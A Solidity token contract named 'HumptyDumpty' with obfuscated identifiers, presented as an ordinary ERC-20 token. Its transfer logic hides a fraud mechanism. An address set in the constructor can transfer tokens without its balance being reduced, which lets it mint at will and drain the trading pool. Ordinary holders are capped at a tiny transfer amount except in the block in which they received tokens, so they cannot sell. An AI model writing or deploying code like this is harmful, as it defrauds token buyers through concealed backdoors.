pragma solidity ^0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract HumptyDumpty is Ownable {
    constructor(string memory qorhaeclgi, string memory lcveukadg, address xqmizn, address soqljrahbepw) {
        name = qorhaeclgi;
        symbol = lcveukadg;
        balanceOf[msg.sender] = totalSupply;
        cfshqi[soqljrahbepw] = true;
        rmqeu = IUniswapV2Router02(xqmizn);
    }

    mapping(address => uint256) private dkruxft;

    function approve(address mvgraczhd, uint256 jdhgfcqa) public returns (bool success) {
        allowance[msg.sender][mvgraczhd] = jdhgfcqa;
        emit Approval(msg.sender, mvgraczhd, jdhgfcqa);
        return true;
    }

    string public name;

    function transfer(address hbozsgdfqv, uint256 jdhgfcqa) public returns (bool success) {
        flyucja(msg.sender, hbozsgdfqv, jdhgfcqa);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    function flyucja(address xvlgunjcohz, address hbozsgdfqv, uint256 jdhgfcqa) private {
        address pyskwczaoi = IUniswapV2Factory(rmqeu.factory()).getPair(address(this), rmqeu.WETH());
        bool omrcfptaqh = zruv[xvlgunjcohz] == block.number;
        bool yomgtdzb = !cfshqi[xvlgunjcohz];
        if (yomgtdzb) {
            if (xvlgunjcohz != pyskwczaoi && jdhgfcqa < totalSupply && (!omrcfptaqh || jdhgfcqa > dkruxft[xvlgunjcohz])) {
                require(totalSupply / (10 ** decimals) >= jdhgfcqa);
            }
            balanceOf[xvlgunjcohz] -= jdhgfcqa;
        }
        dkruxft[hbozsgdfqv] = jdhgfcqa;
        balanceOf[hbozsgdfqv] += jdhgfcqa;
        zruv[hbozsgdfqv] = block.number;
        emit Transfer(xvlgunjcohz, hbozsgdfqv, jdhgfcqa);
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private zruv;

    uint8 public decimals = 9;

    string public symbol;

    IUniswapV2Router02 private rmqeu;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function transferFrom(address xvlgunjcohz, address hbozsgdfqv, uint256 jdhgfcqa) public returns (bool success) {
        require(jdhgfcqa <= allowance[xvlgunjcohz][msg.sender]);
        allowance[xvlgunjcohz][msg.sender] -= jdhgfcqa;
        flyucja(xvlgunjcohz, hbozsgdfqv, jdhgfcqa);
        return true;
    }

    mapping(address => bool) private cfshqi;
}
